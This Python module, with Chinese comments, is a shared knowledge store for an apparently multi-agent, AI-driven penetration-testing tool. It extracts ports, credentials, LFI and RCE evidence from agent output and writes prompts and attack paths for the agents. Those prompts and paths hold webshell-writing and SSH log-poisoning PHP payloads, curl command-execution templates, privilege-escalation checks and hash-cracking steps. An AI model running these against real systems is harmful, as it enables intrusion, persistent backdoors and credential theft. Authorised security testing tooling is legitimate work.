"""黑板模式 - 渗透测试共享知识库

结构化存储所有发现，生成紧凑状态提示注入Agent上下文，
替代低效的历史对话检索，解决跨Agent上下文丢失问题。
"""

import re
import os
import json
from dataclasses import dataclass, field, asdict
from typing import Dict, List, Optional, Any
from datetime import datetime


@dataclass
class PortInfo:
    port: int
    protocol: str = "tcp"
    service: str = ""
    version: Optional[str] = None
    state: str = "open"
    banner: Optional[str] = None
    host: str = ""

    def display(self) -> str:
        ver = f"({self.version})" if self.version else ""
        return f"{self.port}/{self.service}{ver}"


@dataclass
class VulnInfo:
    name: str
    severity: str = "medium"
    confirmed: bool = False
    exploited: bool = False
    evidence: Optional[str] = None
    details: Dict[str, Any] = field(default_factory=dict)

    def display(self) -> str:
        status = "✅" if self.confirmed else "⚠️"
        exploited = "已利用" if self.exploited else ""
        return f"{self.name}({status}{exploited})"


@dataclass
class CredInfo:
    username: str
    password: Optional[str] = None
    hash_value: Optional[str] = None
    hash_type: Optional[str] = None
    service: Optional[str] = None
    source: Optional[str] = None

    def display(self) -> str:
        if self.password:
            return f"{self.username}:{self.password}"
        elif self.hash_value:
            htype = self.hash_type or "hash"
            cracked = self.password if self.password else "未破解"
            return f"{self.username}({htype}:{cracked})"
        return self.username


@dataclass
class RCEContext:
    method: str = ""
    target_url: str = ""
    param_name: str = ""
    output_method: str = "direct"
    privilege: str = ""
    shell_access: bool = False


@dataclass
class AttackPath:
    id: str = ""
    name: str = ""
    priority: int = 99
    status: str = "pending"
    steps: List[str] = field(default_factory=list)
    result: Optional[str] = None


@dataclass
class ExecLog:
    step_name: str = ""
    status: str = ""
    output: str = ""
    timestamp: str = ""


LFI_CONFIRM_PATTERNS = [
    r"root:x:0:0",
    r"nobody:x:65534",
    r"Daemon User",
    r"<\?php\s+(?:include|require)",
    r"allow_url_include",
    r"SERVER_SOFTWARE",
]

PHPINFO_INDICATORS = [
    r"phpinfo\(\)",
    r"PHP Version\s*<",
    r'<td class="e">PHP Version</td>',
    r"PHP Configuration",
]

RCE_UID_PATTERNS = [
    re.compile(r"uid=(\d+)\(([^)]+)\)"),
    re.compile(r"gid=(\d+)\(([^)]+)\)"),
    re.compile(r"uid=(\d+)"),
]

APR1_PATTERN = re.compile(r"\$(apr1|1|5|6|2[ayb]?)\$[^\s:]+")
HTPASSWD_PATTERN = re.compile(
    r"(\w+):(\$apr1\$[^:\s]+|\$1\$[^:\s]+|\$5\$[^:\s]+|\$6\$[^:\s]+|[^\s:]+)"
)


class Blackboard:
    """渗透测试共享知识库 - 黑板模式"""

    VERSION = 1

    def __init__(self):
        self.target: str = ""
        self.phase: str = "reconnaissance"

        self.ports: Dict[str, PortInfo] = {}
        self.vulns: Dict[str, VulnInfo] = {}
        self.creds: Dict[str, CredInfo] = {}

        self.lfi_confirmed: bool = False
        self.lfi_url: str = ""
        self.lfi_param: str = ""
        self.lfi_includes_phpinfo: bool = False

        self.rce: Optional[RCEContext] = None
        self._rce_pending_count: int = 0
        self._rce_pending_method: str = ""
        self._rce_pending_output: str = ""

        self.attack_paths: List[AttackPath] = []

        self.execution_log: Dict[str, ExecLog] = {}
        self.failed_attempts: List[str] = []

        self.page_keywords: List[str] = []

    # ==================== 核心方法：生成Agent提示 ====================

    def get_pentest_prompt(self, max_tokens: int = 400) -> str:
        """生成紧凑的渗透状态提示，严格控制 token 预算"""
        lines = []

        target_display = self.target[:30] if self.target else "未知"
        rce_status = ""
        if self.rce:
            rce_status = f" | RCE:{self.rce.method}({self.rce.privilege})"
        elif self._rce_pending_count >= 1:
            rce_status = " | RCE:待确认"
        lines.append(
            f"【渗透黑板】目标:{target_display} | 阶段:{self.phase}{rce_status}"
        )

        if self.ports:
            port_strs = [p.display() for p in list(self.ports.values())[:8]]
            lines.append(f"端口: {', '.join(port_strs)}")

        if self.vulns:
            vuln_strs = [v.display() for v in list(self.vulns.values())[:4]]
            lines.append(f"漏洞: {', '.join(vuln_strs)}")

        if self.rce:
            lines.append(
                f"RCE方法: {self.rce.method}, "
                f"输出: {self.rce.output_method}, "
                f"权限: {self.rce.privilege}"
            )

        if self.creds:
            cred_strs = [c.display() for c in list(self.creds.values())[:3]]
            lines.append(f"凭据: {', '.join(cred_strs)}")

        if self.lfi_confirmed:
            lfi_status = "✅确认"
            if self.lfi_includes_phpinfo:
                lfi_status += ", 需输出重定向(> /tmp/out.txt)"
            if self.lfi_param:
                lfi_status += f", 参数:{self.lfi_param}"
            lines.append(f"LFI: {lfi_status}")

        if self.failed_attempts:
            unique_fails = list(dict.fromkeys(self.failed_attempts[-6:]))
            lines.append(f"已失败: {', '.join(unique_fails)}")

        if self.attack_paths:
            active_paths = [
                p for p in self.attack_paths if p.status in ("pending", "in_progress")
            ][:3]
            if active_paths:
                path_strs = [
                    f"#{p.priority} {p.name}[{p.status}]" for p in active_paths
                ]
                lines.append(f"攻击路径: {' | '.join(path_strs)}")

        if self.rce and self.rce.output_method == "redirect" and self.lfi_param:
            lines.append(
                f"RCE模板: ?{self.lfi_param}=/var/log/auth.log&cmd={{CMD}} > /tmp/out.txt; "
                f"读取: ?{self.lfi_param}=/tmp/out.txt"
            )
        elif self.rce and self.rce.output_method == "webshell":
            lines.append(f"RCE模板: curl http://{self.target}/shell.php?c={{CMD}}")

        if self.rce and not self.rce.shell_access:
            lines.append("下一步: 执行提权检查(uname -a, sudo -l, find / -perm -4000)")
        elif not self.rce and self.lfi_confirmed and not self.attack_paths:
            lines.append("下一步: 尝试LFI→RCE(SSH日志注入/PHP Session竞态)")

        result = "\n".join(lines)

        estimated_tokens = len(result) / 2
        if estimated_tokens > max_tokens:
            max_chars = max_tokens * 2
            result = result[:max_chars] + "\n...(更多状态省略)"

        return result

    # ==================== 核心方法：从结果更新黑板 ====================

    def update_from_result(self, category: str, result: str):
        """从Agent执行结果中提取结构化数据，更新黑板"""
        if not result:
            return

        if category == "information_collection":
            self._extract_hosts(result)

        if category in ("scanning", "information_collection"):
            self._extract_ports(result)

        if category == "enumeration":
            self._extract_enumeration_data(result)

        if category in ("web_exploitation", "exploitation", "enumeration"):
            self._check_lfi(result)
            self._check_rce(result)

        if category in ("web_exploitation", "exploitation"):
            self._extract_vulnerabilities(result)

        if category in (
            "web_exploitation",
            "exploitation",
            "password_crypto",
            "enumeration",
        ):
            self._extract_credentials(result)
            self._extract_htpasswd(result)

        self._extract_page_keywords(result)
        self._generate_attack_paths()

    def mark_attempt(self, step_name: str, status: str, output: str = ""):
        """记录执行结果，同步更新攻击路径"""
        self.execution_log[step_name] = ExecLog(
            step_name=step_name,
            status=status,
            output=output[:200],
            timestamp=datetime.now().isoformat(),
        )

        if status == "failed":
            normalized = step_name.lower().strip()
            if not any(
                normalized in existing.lower() for existing in self.failed_attempts
            ):
                self.failed_attempts.append(step_name)
            if len(self.failed_attempts) > 10:
                self.failed_attempts = self.failed_attempts[-10:]

        for path in self.attack_paths:
            step_lower = step_name.lower()
            path_text = (path.name + " ".join(path.steps)).lower()
            if any(word in path_text for word in step_lower.split()):
                if status == "success":
                    path.status = "success"
                    path.result = output[:200]
                elif status == "failed":
                    if path.status != "success":
                        path.status = "failed"
                        path.result = output[:200]

    # ==================== 提取方法 ====================

    def _extract_hosts(self, result: str):
        ip_pattern = re.compile(
            r"(?:(?:25[0-5]|2[0-4]\d|[01]?\d\d?)\.){3}"
            r"(?:25[0-5]|2[0-4]\d|[01]?\d\d?)"
        )
        for match in ip_pattern.findall(result):
            if match not in ("0.0.0.0", "127.0.0.1", "255.255.255.255"):
                if self.target and match == self.target:
                    continue
                if not self.ports and not self.target:
                    pass

    def _extract_ports(self, result: str):
        patterns = [
            re.compile(
                r"(\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3})[:\s]+(\d+)\s+open\s+(\S+)",
                re.IGNORECASE,
            ),
            re.compile(r"(\d+)/tcp\s+open\s+(\S+)(?:\s+(.+))?", re.IGNORECASE),
            re.compile(r"(\d+)/udp\s+open\s+(\S+)(?:\s+(.+))?", re.IGNORECASE),
        ]

        for pattern in patterns:
            for match in pattern.finditer(result):
                try:
                    groups = match.groups()
                    if len(groups) >= 3 and "." in groups[0]:
                        host, port, service = groups[0], int(groups[1]), groups[2]
                        version = groups[3] if len(groups) > 3 and groups[3] else None
                    elif len(groups) >= 2:
                        port, service = int(groups[0]), groups[1]
                        host = self.target or "unknown"
                        version = groups[2] if len(groups) > 2 and groups[2] else None
                    else:
                        continue

                    key = f"{port}/tcp"
                    if key not in self.ports:
                        self.ports[key] = PortInfo(
                            port=port,
                            service=service.strip(),
                            version=version.strip() if version else None,
                            host=host,
                        )
                except (ValueError, IndexError):
                    continue

    def _extract_enumeration_data(self, result: str):
        patterns = [
            (r"(?:username|user|login)[\s:]+(\S+)", "username"),
            (r"(?:share|directory)[\s:]+(\S+)", "share"),
        ]
        for pattern, info_type in patterns:
            for match in re.finditer(pattern, result, re.IGNORECASE):
                value = match.group(1)
                if info_type == "username" and value not in self.creds:
                    self.creds[value] = CredInfo(username=value, source="enumeration")

    def _check_lfi(self, result: str):
        for pattern in LFI_CONFIRM_PATTERNS:
            if re.search(pattern, result, re.IGNORECASE):
                self.lfi_confirmed = True
                break

        for pattern in PHPINFO_INDICATORS:
            if re.search(pattern, result, re.IGNORECASE):
                self.lfi_includes_phpinfo = True
                break

        if self.target:
            target_escaped = re.escape(self.target)
            lfi_pattern = rf"(https?://{target_escaped}[^?]*\?(?:image|file|page|path|include|template|doc|lang|cat|dir|action)=)"
            match = re.search(lfi_pattern, result)
            if match:
                self.lfi_url = match.group(1)
                param_match = re.search(r"\?(\w+)=", match.group(0))
                if param_match:
                    self.lfi_param = param_match.group(1)
        else:
            lfi_pattern = r"(https?://[^?]*\?(?:image|file|page|path|include)=)"
            match = re.search(lfi_pattern, result)
            if match:
                self.lfi_url = match.group(1)
                param_match = re.search(r"\?(\w+)=", match.group(0))
                if param_match:
                    self.lfi_param = param_match.group(1)

    def _check_rce(self, result: str):
        for pattern in RCE_UID_PATTERNS:
            match = pattern.search(result)
            if match:
                self._rce_pending_count += 1
                self._rce_pending_method = "lfi"
                self._rce_pending_output = result[:500]

                if self._rce_pending_count >= 2 and not self.rce:
                    privilege = "unknown"
                    for uid_pattern in RCE_UID_PATTERNS:
                        uid_match = uid_pattern.search(result)
                        if uid_match:
                            groups = uid_match.groups()
                            if len(groups) >= 2:
                                privilege = groups[1]
                            elif len(groups) >= 1:
                                privilege = f"uid_{groups[0]}"
                            break

                    output_method = "direct"
                    if self.lfi_includes_phpinfo:
                        output_method = "redirect"

                    self.rce = RCEContext(
                        method=self._rce_pending_method,
                        target_url=self.lfi_url,
                        param_name=self.lfi_param,
                        output_method=output_method,
                        privilege=privilege,
                        shell_access=False,
                    )
                break

        shell_indicators = [
            re.compile(
                r"shell\s*(?:is\s*)?(?:running|connected|spawned)", re.IGNORECASE
            ),
            re.compile(r"connection\s+from\s+\d+\.\d+\.\d+\.\d+", re.IGNORECASE),
            re.compile(r"Listening\s+on\s+\d+\.\d+\.\d+\.\d+:\d+", re.IGNORECASE),
        ]
        for pattern in shell_indicators:
            if pattern.search(result):
                if self.rce:
                    self.rce.shell_access = True
                break

    def _extract_vulnerabilities(self, result: str):
        vuln_patterns = [
            (r"(CVE-\d{4}-\d{4,})", "CVE", "high"),
            (r"(SQL\s*injection)", "sqli", "critical"),
            (r"(XSS|Cross-site scripting)", "xss", "medium"),
            (r"(Remote\s*code\s*execution|RCE)", "rce", "critical"),
            (r"(Local\s*file\s*inclusion|LFI)", "lfi", "high"),
            (r"(Directory\s*traversal)", "traversal", "medium"),
            (r"(Buffer\s*overflow)", "buffer_overflow", "high"),
            (r"(Authentication\s*bypass)", "auth_bypass", "high"),
            (r"(Default\s*credentials?)", "default_creds", "high"),
        ]

        for pattern, vuln_name, severity in vuln_patterns:
            for match in re.finditer(pattern, result, re.IGNORECASE):
                key = vuln_name.lower()
                if key not in self.vulns:
                    self.vulns[key] = VulnInfo(
                        name=vuln_name,
                        severity=severity,
                        confirmed=True,
                        evidence=match.group(0)[:200],
                    )

        if self.lfi_confirmed and "lfi" not in self.vulns:
            self.vulns["lfi"] = VulnInfo(
                name="LFI",
                severity="high",
                confirmed=True,
                evidence=f"参数 {self.lfi_param} 可包含任意文件",
                exploited=self.rce is not None,
            )

    def _extract_credentials(self, result: str):
        patterns = [
            (r"(?:username|user|login)[\s:]+(\S+)", "username"),
            (r"(?:password|passwd|pass|pwd)[\s:]+(\S+)", "password"),
        ]
        for pattern, cred_type in patterns:
            for match in re.finditer(pattern, result, re.IGNORECASE):
                value = match.group(1).strip("',\"")
                if cred_type == "username" and value not in self.creds:
                    self.creds[value] = CredInfo(username=value, source="extraction")
                elif cred_type == "password" and self.creds:
                    last_key = list(self.creds.keys())[-1]
                    if not self.creds[last_key].password:
                        self.creds[last_key].password = value

    def _extract_htpasswd(self, result: str):
        for match in HTPASSWD_PATTERN.finditer(result):
            username = match.group(1)
            hash_val = match.group(2)
            if hash_val.startswith("$"):
                hash_type_map = {
                    "$apr1$": "apr1",
                    "$1$": "md5crypt",
                    "$5$": "sha256",
                    "$6$": "sha512",
                    "$2a$": "bcrypt",
                    "$2b$": "bcrypt",
                    "$2y$": "bcrypt",
                }
                prefix = "$" + hash_val.split("$")[1] + "$"
                hash_type = hash_type_map.get(prefix, "unknown")
            else:
                hash_type = "plain"

            key = f"htpasswd_{username}"
            if key not in self.creds:
                self.creds[key] = CredInfo(
                    username=username,
                    hash_value=hash_val,
                    hash_type=hash_type,
                    source="htpasswd",
                )

    def _extract_page_keywords(self, result: str):
        title_match = re.search(r"<title>([^<]+)</title>", result, re.IGNORECASE)
        if title_match:
            title = title_match.group(1).strip()
            words = re.findall(r"[a-zA-Z]{3,}", title)
            for word in words:
                word_lower = word.lower()
                if (
                    word_lower not in self.page_keywords
                    and len(self.page_keywords) < 20
                ):
                    self.page_keywords.append(word_lower)

        heading_match = re.search(
            r"<h[1-3][^>]*>([^<]+)</h[1-3]>", result, re.IGNORECASE
        )
        if heading_match:
            heading = heading_match.group(1).strip()
            words = re.findall(r"[a-zA-Z]{3,}", heading)
            for word in words:
                word_lower = word.lower()
                if (
                    word_lower not in self.page_keywords
                    and len(self.page_keywords) < 20
                ):
                    self.page_keywords.append(word_lower)

    # ==================== 攻击路径管理 ====================

    def _generate_attack_paths(self):
        """根据当前发现自动生成/更新攻击路径，保留已有路径状态"""
        old_status = {p.id: (p.status, p.result) for p in self.attack_paths}

        new_paths = []

        path_id = 0

        if self.rce and not self.rce.shell_access:
            path_id += 1
            new_paths.append(
                AttackPath(
                    id=f"priv_esc_{path_id}",
                    name=f"提权({self.rce.privilege}→root)",
                    priority=path_id,
                    status="pending",
                    steps=[
                        "uname -a > /tmp/out.txt",
                        "cat /etc/os-release > /tmp/out.txt",
                        "sudo -l > /tmp/out.txt",
                        "find / -perm -4000 2>/dev/null > /tmp/out.txt",
                        "cat /etc/crontab > /tmp/out.txt",
                    ],
                )
            )

        if self.rce and self.lfi_includes_phpinfo:
            path_id += 1
            new_paths.append(
                AttackPath(
                    id=f"webshell_{path_id}",
                    name="写入PHP webshell获取干净RCE",
                    priority=path_id,
                    status="pending",
                    steps=[
                        "echo '<?php system($_GET[\"c\"]); ?>' > /var/www/html/shell.php",
                        "访问 shell.php?c=id 确认RCE",
                    ],
                )
            )

        if self.lfi_confirmed and not self.rce:
            has_ssh = any("ssh" in p.service.lower() for p in self.ports.values())
            if has_ssh:
                path_id += 1
                new_paths.append(
                    AttackPath(
                        id=f"ssh_log_poison_{path_id}",
                        name="SSH日志注入→LFI→RCE(paramiko)",
                        priority=path_id,
                        status="pending",
                        steps=[
                            "paramiko注入 <?php system($_GET['cmd']); ?>",
                            "LFI包含 /var/log/auth.log",
                            "输出重定向验证RCE",
                        ],
                    )
                )

            path_id += 1
            new_paths.append(
                AttackPath(
                    id=f"php_session_race_{path_id}",
                    name="PHP Session Upload Progress竞态条件",
                    priority=path_id,
                    status="pending",
                    steps=[
                        "同时发送上传请求和包含请求",
                        "包含 /var/lib/php/sessions/sess_<PHPSESSID>",
                        "验证RCE",
                    ],
                )
            )

        for key, cred in self.creds.items():
            if cred.hash_value and not cred.password:
                path_id += 1
                service = cred.service or "unknown"
                new_paths.append(
                    AttackPath(
                        id=f"crack_hash_{path_id}",
                        name=f"破解{cred.username}哈希({cred.hash_type})→{service}",
                        priority=path_id,
                        status="pending",
                        steps=[
                            f"openssl验证目标主题词",
                            f"hashcat -m {cred.hash_type} fasttrack.txt",
                        ],
                    )
                )

        has_http = any(
            p.service.lower() in ("http", "https", "http-alt", "nginx", "apache")
            for p in self.ports.values()
        )
        if has_http and not self.lfi_confirmed and not self.rce:
            path_id += 1
            new_paths.append(
                AttackPath(
                    id=f"web_enum_{path_id}",
                    name="Web目录枚举与漏洞发现",
                    priority=path_id,
                    status="pending",
                    steps=[
                        "gobuster dir扫描",
                        "检查常见漏洞文件",
                        "测试LFI参数",
                    ],
                )
            )

        for path in new_paths:
            if path.id in old_status:
                path.status, path.result = old_status[path.id]

        failed_path_ids = set()
        for fail in self.failed_attempts:
            fail_lower = fail.lower()
            for path in new_paths:
                path_text = (path.name + " ".join(path.steps)).lower()
                if any(w in path_text for w in fail_lower.split()):
                    if path.status == "failed":
                        failed_path_ids.add(path.id)

        new_paths.sort(key=lambda p: p.priority)

        self.attack_paths = new_paths

    # ==================== 便利方法 ====================

    def get_rce_command_template(self) -> str:
        if not self.rce:
            return ""

        if self.rce.output_method == "redirect" and self.lfi_param:
            lfi_path = "/var/log/auth.log"
            return (
                f'curl -s "http://{self.target}*LFI_PATH*?'
                f'{self.lfi_param}={lfi_path}&cmd={{CMD}} > /tmp/out.txt" && '
                f'curl -s "http://{self.target}*LFI_PATH*?'
                f'{self.lfi_param}=/tmp/out.txt" | tail -5'
            )
        elif self.rce.output_method == "webshell":
            return f'curl -s "http://{self.target}/shell.php?c={{CMD}}"'
        else:
            return f'curl -s "http://{self.target}*LFI_PATH*?cmd={{CMD}}"'

    def get_keyword_wordlist(self) -> List[str]:
        words = []
        words.extend(self.page_keywords)

        for key in self.creds:
            username = self.creds[key].username
            if username and username not in (
                "unknown",
                "nginx",
                "www-data",
                "root",
                "admin",
            ):
                words.append(username.lower())

        if self.target:
            ip_parts = self.target.split(".")
            domain_guesses = [f"target{ip_parts[-1]}"]
            words.extend(domain_guesses)

        return list(dict.fromkeys(words))

    def get_next_action_hint(self) -> str:
        if self.rce and not self.rce.shell_access:
            return (
                "执行提权检查：uname -a, sudo -l, find / -perm -4000, cat /etc/crontab"
            )
        if self.rce and self.rce.shell_access:
            return "已有交互式shell，进行信息收集和提权"
        if self.lfi_confirmed and self.lfi_includes_phpinfo:
            return "使用输出重定向(> /tmp/out.txt)执行RCE命令，然后LFI读取/tmp/out.txt"
        if self.lfi_confirmed and not self.rce:
            return "SSH日志注入(paramiko)→包含auth.log→RCE"
        if self.creds and any(
            c.hash_value and not c.password for c in self.creds.values()
        ):
            return "用openssl验证主题词密码，然后hashcat fasttrack.txt"
        if self.ports and not self.lfi_confirmed:
            return "对Web服务枚举目录和参数，寻找LFI/注入漏洞"
        if not self.ports:
            return "执行端口扫描 nmap -sS -T4 -Pn --top-ports 1000 <target>"
        return "继续枚举和漏洞发现"

    # ==================== 持久化 ====================

    def save(self, filepath: str):
        """原子保存：写临时文件 → 重命名"""
        data = self.to_dict()

        tmp_path = filepath + ".tmp"
        try:
            os.makedirs(
                os.path.dirname(filepath) if os.path.dirname(filepath) else ".",
                exist_ok=True,
            )
            with open(tmp_path, "w", encoding="utf-8") as f:
                json.dump(data, f, ensure_ascii=False, indent=2, default=str)
            os.replace(tmp_path, filepath)
        except Exception as e:
            if os.path.exists(tmp_path):
                try:
                    os.unlink(tmp_path)
                except OSError:
                    pass
            raise

    def load(self, filepath: str):
        """安全加载：文件不存在则初始化空黑板，版本不兼容则迁移"""
        if not os.path.exists(filepath):
            return

        try:
            with open(filepath, "r", encoding="utf-8") as f:
                data = json.load(f)
        except (json.JSONDecodeError, FileNotFoundError, OSError):
            return

        version = data.get("_version", 0)
        if version < self.VERSION:
            data = self._migrate(data, version)

        self._from_dict(data)

    def to_dict(self) -> dict:
        return {
            "_version": self.VERSION,
            "target": self.target,
            "phase": self.phase,
            "ports": {k: asdict(v) for k, v in self.ports.items()},
            "vulns": {k: asdict(v) for k, v in self.vulns.items()},
            "creds": {k: asdict(v) for k, v in self.creds.items()},
            "lfi_confirmed": self.lfi_confirmed,
            "lfi_url": self.lfi_url,
            "lfi_param": self.lfi_param,
            "lfi_includes_phpinfo": self.lfi_includes_phpinfo,
            "rce": asdict(self.rce) if self.rce else None,
            "_rce_pending_count": self._rce_pending_count,
            "_rce_pending_method": self._rce_pending_method,
            "attack_paths": [asdict(p) for p in self.attack_paths],
            "execution_log": {k: asdict(v) for k, v in self.execution_log.items()},
            "failed_attempts": self.failed_attempts,
            "page_keywords": self.page_keywords,
        }

    def _from_dict(self, data: dict):
        self.target = data.get("target", "")
        self.phase = data.get("phase", "reconnaissance")

        self.ports = {}
        for k, v in data.get("ports", {}).items():
            self.ports[k] = PortInfo(**v)

        self.vulns = {}
        for k, v in data.get("vulns", {}).items():
            self.vulns[k] = VulnInfo(**v)

        self.creds = {}
        for k, v in data.get("creds", {}).items():
            self.creds[k] = CredInfo(**v)

        self.lfi_confirmed = data.get("lfi_confirmed", False)
        self.lfi_url = data.get("lfi_url", "")
        self.lfi_param = data.get("lfi_param", "")
        self.lfi_includes_phpinfo = data.get("lfi_includes_phpinfo", False)

        rce_data = data.get("rce")
        self.rce = RCEContext(**rce_data) if rce_data else None

        self._rce_pending_count = data.get("_rce_pending_count", 0)
        self._rce_pending_method = data.get("_rce_pending_method", "")

        self.attack_paths = []
        for p_data in data.get("attack_paths", []):
            self.attack_paths.append(AttackPath(**p_data))

        self.execution_log = {}
        for k, v in data.get("execution_log", {}).items():
            self.execution_log[k] = ExecLog(**v)

        self.failed_attempts = data.get("failed_attempts", [])
        self.page_keywords = data.get("page_keywords", [])

    def _migrate(self, data: dict, old_version: int) -> dict:
        if old_version < 1:
            data.setdefault("attack_paths", [])
            data.setdefault("failed_attempts", [])
            data.setdefault("page_keywords", [])
            data.setdefault("execution_log", {})
            data.setdefault("_rce_pending_count", 0)
            data.setdefault("_rce_pending_method", "")
        data["_version"] = self.VERSION
        return data

    @classmethod
    def from_test_state(cls, test_state) -> "Blackboard":
        """从现有TestState转换"""
        bb = cls()
        bb.target = test_state.target
        bb.phase = test_state.phase

        for svc in test_state.discovered_services:
            key = f"{svc.port}/tcp"
            bb.ports[key] = PortInfo(
                port=svc.port,
                service=svc.service,
                version=svc.version,
                host=svc.host,
                banner=svc.banner if hasattr(svc, "banner") else None,
            )

        for vuln in test_state.discovered_vulns:
            key = vuln.name.lower().replace(" ", "_")
            bb.vulns[key] = VulnInfo(
                name=vuln.name,
                severity=vuln.severity,
                evidence=vuln.evidence,
            )

        for cred in test_state.discovered_creds:
            key = cred.username or "unknown"
            bb.creds[key] = CredInfo(
                username=cred.username,
                password=cred.password,
                hash_value=cred.hash if hasattr(cred, "hash") else None,
                service=cred.service,
                source=cred.source,
            )

        return bb
